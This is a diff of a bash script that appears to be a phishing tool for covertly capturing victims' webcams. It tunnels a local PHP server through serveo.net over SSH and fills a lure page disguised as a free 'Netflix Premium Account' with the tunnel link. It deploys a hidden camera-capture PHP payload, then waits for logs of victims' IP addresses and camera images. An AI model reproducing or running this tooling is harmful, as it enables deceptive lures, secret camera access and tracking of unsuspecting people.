@@ -63,63 +63,6 @@ cat ip.txt >> saved_ip.txt
 
 
 }
-
-checkfound() {
-
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-while [ true ]; do
-
-
-if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-catch_ip
-rm -rf ip.txt
-
-fi
-
-sleep 0.5
-
-if [[ -e ".cam.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam received!\e[0m\n"
-rm -rf .cam.log
-fi
-sleep 0.5
-
-done 
-
-}
-
-
-server() {
-
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:5555 serveo.net  2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:5555 serveo.net 2> /dev/null > sendlink ' &
-
-sleep 8
-fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:5555)\e[0m\n"
-fuser -k 5555/tcp > /dev/null 2>&1
-php -S localhost:5555 > /dev/null 2>&1 &
-sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
-
-}
-
-
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -203,17 +146,33 @@ fi
 
 }
 
+checkfound() {
 
-payload() {
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$send_link'+g' .hiddencam.php > index.php
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
 
+fi
+
+sleep 0.5
+
+if [[ -e ".cam.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam received!\e[0m\n"
+rm -rf .cam.log
+fi
+sleep 0.5
+
+done 
 
 }
 
+##################################################################
 start() {
 
 default_choose_sub="Y"
@@ -234,6 +193,45 @@ payload
 checkfound
 
 }
+server() {
+
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:5555 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:5555 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:5555)\e[0m\n"
+fuser -k 5555/tcp > /dev/null 2>&1
+php -S localhost:5555 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+
+}
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+sed 's+forwarding_link+'$send_link'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$send_link'+g' .hiddencam.php > index.php
+
+
+}
+
+
 
 banner
 dependencies
